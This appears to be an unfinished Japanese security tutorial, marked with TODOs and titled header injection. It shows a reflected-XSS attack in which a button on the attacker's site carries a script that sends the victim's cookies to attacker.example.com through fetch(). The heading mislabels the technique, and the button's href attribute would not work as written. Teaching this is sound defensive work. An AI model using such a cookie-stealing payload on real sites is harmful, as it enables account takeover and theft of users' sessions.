# ヘッダーインジェクション

(TODO: 説明をリッチにする)

victim.example.com では、ユーザーが送信した名前と年齢を返すようなサービスを提供しています。 (TODO: 画像)
このサービスはほかの人の名前や年齢を表示しないため、先ほど使った XSS は使えません。

あなたは、 victim.example.com で利用させれているログイン情報を盗みたいです。ログイン情報は、 cookie に保存されているものとします。

自身のウェブサイトで次のようなボタンを用意し、被害者に押させましょう。

```html
<button href='https://victim.example.com/?name=<script>fetch("https://attacker.example.com?data="+document.cookie)</script>&age=0'>
  押して！
</button>
```
